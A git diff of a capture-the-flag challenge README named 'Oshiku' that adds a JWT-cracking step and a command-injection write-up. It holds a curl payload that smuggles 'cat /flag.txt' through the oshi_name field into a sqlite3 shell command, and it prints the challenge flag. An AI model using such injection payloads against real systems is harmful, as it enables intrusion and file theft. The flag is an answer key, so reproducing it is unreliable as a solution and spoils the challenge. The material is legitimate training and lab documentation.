@@ -1,6 +1,6 @@
 # Oshiku
 
-Author: [VascoZ]
+Author: VascoZ
 
 ## Description
 
@@ -16,12 +16,12 @@ None
 
 ## Tags
 
-- Command Injection
+- Command Injection , JWT Crack
 
 ## Exploit
 
-Command Injection (into a prepared sql statement) query = 'sqlite3 database.db "SELECT biography FROM oshi WHERE name=\'' + str(name) +'\'\"'
-
+- JWT-CRACK to access admin only page
+- Command Injection (into a prepared sql statement) query = 'sqlite3 database.db "SELECT biography FROM oshi WHERE name=\'' + str(name) +'\'\"'
 exploit : curl -X POST -d "oshi_name=freya\"%20;%20cat%20/flag.txt;echo%20\"" (url)
 
 
@@ -37,5 +37,6 @@ WRECKIT50{oshikucumansatuk0k_satujkt}
 
 
 ## Severity
-MEDIUM
+HARD
+
 
